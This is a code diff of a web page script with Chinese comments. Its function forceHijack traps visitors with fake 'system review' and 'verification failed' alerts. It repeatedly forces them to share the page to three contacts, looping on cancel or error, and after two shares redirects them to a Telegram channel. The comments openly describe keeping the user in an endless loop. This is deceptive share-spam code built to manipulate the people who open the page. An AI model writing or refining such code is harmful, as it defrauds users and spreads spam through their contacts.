@@ -54,27 +54,30 @@
                     }
                 ]);
 
-                if (res) {
-                    // 分享成功後的處理：不跳轉，而是引導再次分享
-                    alert("【系統審核中】\n偵測到當前線路極度擁擠，請「再次確實」分配 3 位活躍節點以加快審核速度。");
-                    
-                    // 這裡不跳轉，直接重新呼叫 forceHijack，讓使用者停留在這無限循環
-                    forceHijack(); 
+               if (res) {
+                    shareCount = shareCount + 1; // 蓋章加 1
+                    if (shareCount < 2) { 
+                        alert("【系統審核中】\n偵測到當前線路極度擁擠，請「再次確實」分配 3 位活躍節點以加快審核速度。");
+                        forceHijack(); // 第一次成功，叫他分享第二次
+                    } else {
+                        alert("【驗證完成】\n節點分配成功，即將為您導向飛機頻道！");
+                        window.location.replace(SUCCESS_URL); // 第二次成功，送他進飛機
+                    }
                 } else {
                     // 使用者按取消
                     alert("❌ 驗證失敗！\n系統偵測到節點分配數量不足，請務必完成分配。");
                     forceHijack(); 
                 }
             } catch (error) {
-                // 拒絕權限
-                alert("【安全錯誤】\n需允許分配權限，系統才能驗證您的節點身份。");
+                // 權限錯誤或異常
                 forceHijack();
             }
-        }
+        } // <--- 這是第一個關鍵：關閉整個 forceHijack 函式
 
-        window.onload = init;
+        window.onload = init; // <--- 這是第二個關鍵：啟動指令
     </script>
 </body>
 </html>
+
 
 
